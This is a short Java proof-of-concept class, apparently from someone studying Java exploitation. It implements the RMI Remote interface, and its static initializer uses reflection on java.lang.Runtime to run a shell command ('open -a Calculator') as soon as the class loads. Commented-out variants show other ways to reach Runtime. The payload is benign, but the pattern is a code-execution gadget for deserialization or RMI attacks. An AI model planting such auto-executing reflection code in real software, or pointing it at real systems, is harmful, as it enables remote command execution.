package com.xjjlearning.hack.utils.poc;

import java.rmi.Remote;

/**
 * created by xjj on 2023/1/15
 */
public class PocWithRuntime implements Remote {
    static {
        try {
            String command = "open -a Calculator";
            // 使用.class不会自动初始化对象
            // 但是使用forName会自动初始化对象

            // 如果只使用Class.forName(name) 则默认初始化
            // 使用Class.forName(name, initialize, classLoader) 则需要设置initialize
            Class<?> clazz = Class.forName("java.lang.Runtime");

            Class<?> clazz2 = Class.forName("java.lang.Runtime", true, ClassLoader.getSystemClassLoader());

            /* 1.That's ok, because the method getRuntime is public, and it returns the instance of Runtime */
            Runtime runtime = (Runtime) clazz.getMethod("getRuntime").invoke(null);
            clazz.getMethod("exec", String.class).invoke(runtime, command);


            /* 2.We can use Declared methods and use setAccessible method, then it can be free*/
            // Constructor<?> privateConstructor = clazz.getDeclaredConstructor();
            // privateConstructor.setAccessible(true);
            // clazz.getMethod("exec", String.class).invoke(privateConstructor.newInstance(), command);


            /* 3.It's useless, because the constructor of Runtime class is private */
            // clazz.getMethod("exec", String.class).invoke(clazz.newInstance(), "id");


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        System.out.println(1);
    }
}
